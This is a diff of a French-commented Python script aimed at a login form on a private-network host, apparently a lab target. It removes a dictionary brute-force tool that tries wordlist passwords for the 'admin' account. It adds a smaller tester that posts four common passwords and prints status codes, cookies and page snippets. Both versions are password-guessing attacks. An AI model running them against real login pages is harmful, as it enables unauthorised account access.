@@ -1,85 +1,129 @@
 import requests
-import itertools
-import string
 import time
 from urllib.parse import urljoin
- 
-# ─────────────────────────────────────────────
-# CONFIGURATION
-# ─────────────────────────────────────────────
-TARGET_URL   = "http://10.11.200.227"
-LOGIN_PATH   = "/index.php?page=signin"          # Chemin du formulaire de login
-USERNAME     = "admin"           # Nom d'utilisateur cible
-FIELD_USER   = "username"        # Nom du champ username dans le formulaire
-FIELD_PASS   = "password"        # Nom du champ password dans le formulaire
-SUCCESS_TEXT = "Dashboard"       # Texte présent dans la réponse en cas de succès
-DELAY        = 0.1               # Délai entre chaque tentative (secondes)
-TIMEOUT      = 5                 # Timeout des requêtes (secondes)
- 
-# ─────────────────────────────────────────────
-# MODE 1 : DICTIONNAIRE (wordlist)
-# ─────────────────────────────────────────────
-def brute_force_wordlist(wordlist_path: str) -> str | None:
-    """Teste chaque mot de passe d'un fichier wordlist."""
-    url = urljoin(TARGET_URL, LOGIN_PATH)
- 
-    try:
-        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
-            passwords = [line.strip() for line in f if line.strip()]
-    except FileNotFoundError:
-        print(f"[ERREUR] Fichier introuvable : {wordlist_path}")
-        return None
- 
-    print(f"[*] Mode dictionnaire | {len(passwords)} mots de passe | cible : {url}")
- 
-    for i, password in enumerate(passwords, 1):
-        try:
-            response = requests.post(
-                url,
-                data={FIELD_USER: USERNAME, FIELD_PASS: password},
-                timeout=TIMEOUT,
-                allow_redirects=True,
-            )
- 
-            print(f"  [{i:>5}] Tentative : {password!r:<20} | Statut : {response.status_code}")
- 
-            if SUCCESS_TEXT in response.text:
-                print(f"\n[✓] MOT DE PASSE TROUVÉ : {password!r}")
-                return password
- 
-            time.sleep(DELAY)
- 
-        except requests.exceptions.ConnectionError:
-            print("[ERREUR] Connexion refusée. Le serveur est-il démarré ?")
-            return None
-        except requests.exceptions.Timeout:
-            print(f"[!] Timeout pour le mot de passe : {password!r}")
- 
-    print("[✗] Mot de passe non trouvé dans le dictionnaire.")
-    return None
- 
 
+# =========================================================
+# CONFIGURATION
+# =========================================================
+
+TARGET_URL = "http://10.11.200.227"
+LOGIN_PATH = "/index.php?page=signin"
+
+# Champs HTML du formulaire
+FIELD_USER = "username"
+FIELD_PASS = "password"
+
+# Compte de test autorisé
+USERNAME = "admin"
+
+# Timeout réseau
+TIMEOUT = 5
+
+# Délai entre requêtes
+DELAY = 1
+
+# =========================================================
+# FONCTION DE TEST
+# =========================================================
+
+def test_login(passwords: list[str]) -> None:
+    """
+    Envoie plusieurs tentatives contrôlées afin de :
+    - vérifier les réponses HTTP
+    - observer les redirections
+    - inspecter les cookies
+    - déboguer le formulaire
+    """
+
+    # MODIFICATION :
+    # Utilisation d'une Session pour conserver les cookies.
+    session = requests.Session()
+
+    url = urljoin(TARGET_URL, LOGIN_PATH)
+
+    print(f"[*] URL cible : {url}")
+    print(f"[*] Nombre de tests : {len(passwords)}")
+    print()
+
+    for index, password in enumerate(passwords, start=1):
+
+        payload = {
+            FIELD_USER: USERNAME,
+            FIELD_PASS: password
+        }
+
+        try:
+            # MODIFICATION :
+            # allow_redirects=True pour suivre automatiquement
+            # les redirections après login.
+            response = session.post(
+                url,
+                data=payload,
+                timeout=TIMEOUT,
+                allow_redirects=True
+            )
+
+            print("=" * 60)
+            print(f"[TEST #{index}]")
+            print(f"Password testé : {password}")
+            print(f"HTTP Status    : {response.status_code}")
+            print(f"URL finale     : {response.url}")
+
+            # MODIFICATION :
+            # Affichage des cookies de session.
+            print(f"Cookies        : {session.cookies.get_dict()}")
+
+            # MODIFICATION :
+            # Affichage d'un extrait HTML pour debug.
+            print("\n--- HTML (200 premiers caractères) ---")
+            print(response.text[:200])
+
+            # MODIFICATION :
+            # Vérification générique d'éléments indiquant
+            # souvent une connexion réussie.
+            success_indicators = [
+                "logout",
+                "dashboard",
+                "welcome",
+                "disconnect"
+            ]
+
+            html_lower = response.text.lower()
+
+            if any(word in html_lower for word in success_indicators):
+                print("\n[+] Indicateur potentiel de connexion détecté")
+
+            time.sleep(DELAY)
+
+        except requests.exceptions.Timeout:
+            print(f"[!] Timeout pour : {password}")
+
+        except requests.exceptions.ConnectionError:
+            print("[!] Impossible de contacter le serveur")
+            return
+
+        except Exception as e:
+            print(f"[!] Erreur inattendue : {e}")
+
+
+# =========================================================
+# POINT D'ENTRÉE
+# =========================================================
 
 if __name__ == "__main__":
-    print("=" * 55)
-    print("  BRUTE FORCE TESTER — localhost:8080")
-    print("  Usage légal uniquement (vos propres systèmes)")
-    print("=" * 55)
-    print()
- 
-    # Choisissez le mode à utiliser :
- 
-    # ── Mode 1 : wordlist externe (ex: rockyou.txt)
-    # result = brute_force_wordlist("wordlist.txt")
- 
-    # ── Mode 2 : génération exhaustive
-    # result = brute_force_generate(charset=string.digits, min_length=4, max_length=4)
- 
-    # ── Mode 3 : liste personnalisée (défaut)
-    result = brute_force_wordlist("pass.txt")
- 
-    print()
-    if result:
-        print(f"[RÉSULTAT] Connexion réussie avec : {result!r}")
-    else:
-        print("[RÉSULTAT] Échec — mot de passe non trouvé.")
+
+    print("=" * 60)
+    print(" TESTEUR DE FORMULAIRE LOGIN")
+    print(" Usage autorisé uniquement")
+    print("=" * 60)
+
+    # MODIFICATION :
+    # Liste de tests contrôlés au lieu d'une wordlist offensive.
+    test_passwords = [
+        "test",
+        "admin",
+        "password123",
+        "demo"
+    ]
+
+    test_login(test_passwords)
